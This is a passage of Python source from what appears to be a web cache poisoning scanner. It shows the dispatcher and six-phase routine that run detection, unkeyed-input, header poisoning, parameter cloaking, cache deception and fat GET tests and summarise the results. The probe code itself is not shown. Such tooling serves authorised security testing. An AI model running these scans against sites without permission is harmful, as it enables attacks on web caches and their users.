            target: Target URL
            scan_type: Type of scan
                - 'detect': Cache detection
                - 'unkeyed': Unkeyed input detection
                - 'header': Header-based poisoning
                - 'cloaking': Parameter cloaking
                - 'deception': Cache deception
                - 'fat_get': Fat GET poisoning
                - 'full': Full cache poisoning scan
        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  CACHE POISONING ADVANCED ENGINE - v5.0.0{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  Fused from: Web-Cache-Vuln-Scanner + Autopoisoner + Custom{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)

        url = target if target.startswith('http') else f"https://{target}"

        scan_map = {
            'detect': lambda: self.detect_cache(url),
            'unkeyed': lambda: self.find_unkeyed_inputs(url),
            'header': lambda: self.test_header_poisoning(url),
            'cloaking': lambda: self.test_param_cloaking(url),
            'deception': lambda: self.test_cache_deception(url),
            'fat_get': lambda: self.test_fat_get(url),
        }

        if scan_type == 'full':
            return self._run_full(url)

        scan_func = scan_map.get(scan_type)
        if scan_func:
            return scan_func()
        else:
            return {
                "vulnerable": False,
                "findings": [],
                "details": {"error": f"Unknown scan type: {scan_type}"},
                "scan_type": scan_type,
            }

    def _run_full(self, url):
        """Full cache poisoning scan"""
        self._print(f"\n{BOLD}{CYAN}  Full Cache Poisoning Scan{RESET}", CYAN)

        all_results = {}

        # Phase 1: Cache Detection
        self._print(f"\n{BOLD}  === Phase 1: Cache Detection ==={RESET}", CYAN)
        all_results['detection'] = self.detect_cache(url)

        # Only proceed if cache is detected
        if not all_results['detection'].get('details', {}).get('cache_detected', False):
            self._print(f"  [-] No caching detected - skipping further tests", YELLOW)
            return {
                "vulnerable": False,
                "findings": all_results['detection'].get('findings', []),
                "details": all_results,
                "scan_type": "cache_poison_full",
            }

        # Phase 2: Unkeyed Input Detection
        self._print(f"\n{BOLD}  === Phase 2: Unkeyed Input Detection ==={RESET}", CYAN)
        all_results['unkeyed'] = self.find_unkeyed_inputs(url)

        # Phase 3: Header Poisoning
        self._print(f"\n{BOLD}  === Phase 3: Header Poisoning ==={RESET}", CYAN)
        all_results['header_poisoning'] = self.test_header_poisoning(url)

        # Phase 4: Parameter Cloaking
        self._print(f"\n{BOLD}  === Phase 4: Parameter Cloaking ==={RESET}", CYAN)
        all_results['param_cloaking'] = self.test_param_cloaking(url)

        # Phase 5: Cache Deception
        self._print(f"\n{BOLD}  === Phase 5: Cache Deception ==={RESET}", CYAN)
        all_results['cache_deception'] = self.test_cache_deception(url)

        # Phase 6: Fat GET Poisoning
        self._print(f"\n{BOLD}  === Phase 6: Fat GET Poisoning ==={RESET}", CYAN)
        all_results['fat_get'] = self.test_fat_get(url)

        # Summary
        total_findings = sum(
            len(r.get('findings', [])) for r in all_results.values() if isinstance(r, dict)
        )
        any_vulnerable = any(
            r.get('vulnerable', False) for r in all_results.values() if isinstance(r, dict)
        )

        self._print(f"\n{BOLD}{CYAN}  ═══ CACHE POISONING SCAN SUMMARY ═══{RESET}", CYAN)
        self._print(f"  Total findings: {total_findings}", CYAN)
        self._print(f"  Vulnerable: {'YES' if any_vulnerable else 'NO'}",
                     RED if any_vulnerable else GREEN)

        return {
            "vulnerable": any_vulnerable,
            "findings": [],
            "details": all_results,
            "scan_type": "cache_poison_full",
        }


# ============================================================================
# MODULE-LEVEL RUN FUNCTION
# ============================================================================

def run(target, scan_type='full', **kwargs):
    """Module-level run function for ZYLON FUSION integration"""
    engine = CachePoisonAdvancedEngine()
    return engine.run(target=target, scan_type=scan_type, **kwargs)
